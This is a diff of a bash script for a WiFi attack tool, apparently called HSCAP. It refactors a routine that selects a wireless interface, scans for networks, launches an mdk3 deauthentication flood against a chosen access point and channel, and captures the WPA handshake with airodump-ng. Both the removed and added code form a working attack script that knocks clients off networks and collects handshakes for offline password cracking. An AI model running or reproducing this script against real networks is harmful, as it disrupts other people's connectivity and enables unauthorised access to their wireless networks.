@@ -3,77 +3,52 @@
 trap end_script SIGINT
 trap end_script SIGTERM
 
+source ".config"
+
 source "assets/variables.sh"
 source "assets/functions.sh"
+source "assets/essentials.sh"
 
 clear && echo -en "\\033]0;$ScriptName | $ScriptVersion\\a"
 
-echo -e "\n Made With Love by $ScriptAuthor "
+echo -e "\n    $ScriptAuthor      Drinking Coffee 24/7    $CRD "
+echo "                                                "
+echo "  ----------------- --------------------------  "
+echo "                                                "
+echo "  ██╗  ██╗ ███████╗  ██████╗  █████╗  ██████╗   "
+echo "  ██║  ██║ ██╔════╝ ██╔════╝ ██╔══██╗ ██╔══██╗  "
+echo "  ███████║ ███████╗ ██║      ███████║ ██████╔╝  "
+echo "  ██╔══██║ ╚════██║ ██║      ██╔══██║ ██╔═══╝   "
+echo "  ██║  ██║ ███████║ ╚██████╗ ██║  ██║ ██║       "
+echo "  ╚═╝  ╚═╝ ╚══════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═╝       "
+echo "                                                "
+echo "  ----------------- --------------------------  "
+echo "                                                "
 
 check_root
 check_bash
 check_caps
 
-echo -en "$CLYW" "\n Press [ENTER] to continue ... "
+echo -en "$CLYW" "\n\n Press [ENTER] to continue ... "
 read -r continue
 
-clear
+echo -en "\\033]0;Interface Selection\\a"
+interface_selection
 
-echo -e "\n\e[0m       These Are The Networks Interfaces You Have "
-echo -e " You Need To Use An Interface With \e[4mMonitor Mode\e[0m Enabled \n"
-
-echo -en "\e[0;33m"
-ip -o link show | awk -F': ' '{print $2}'
-echo -en "\e[0m"
-
-echo -en "\n Enter The Interface You Want To Use >> "
-read -r interface
-
-check_monitor
+echo -en "\\033]0;Explore For Networks\\a"
+explore_for_networks
 
 clear
 
-xterm -geometry 100x25 -e "sudo airodump-ng $interface" &
-processidxterm=$!
+echo "${bssid}" > "${TmpDIR}bl.txt"
 
-echo -en "\n Enter The Mac Address You Want To Deauth >> "
-read -r macadd
+xterm +j -fg red -geometry "$XTermGeometry" -T "mdk3 amok attack" -e mdk3 "$Interface" d -b "${TmpDIR}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+ProcessIdAttack=$!
 
-cat >"${TmpDIR}bl.txt" <<-EOF
-  $macadd
-EOF
+xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
+ProcessIdCapture=$!
 
-clear
-
-echo -en "\n Enter The Channel You Want to Use >> "
-read -r channel
-
-kill $processidxterm
-
-echo " Capturing HandShake "
-
-mdk3 "$interface" d -b "${TmpDIR}bl.txt" -c "$channel" &
-processidattack=$!
-
-airodump-ng -c "$channel" -d "$macadd" -w "${TmpDIR}HandShake" "$interface" &
-processidcapture=$!
-
-sleep 12 && kill $processidattack
-sleep 12 && kill $processidcapture
-
-clear
-
-echo -en "\n Did You Get The HandShake ?  "
-read -r yesno
-
-clear
-
-if [[ $yesno = "y" ]] || [[ $yesno = "yes" ]]; then
-  echo -e "\n Awesome ! Script Will Close Now ... "
-  sleep 2
-else
-  echo -e "\n Sorry To See That... :( \n Please Try Again ! "
-  sleep 2
-fi
+sleep $Mdk3TimeAttack && kill $ProcessIdAttack
+sleep $AirTimeCapture && kill $ProcessIdCapture
 
 end_script
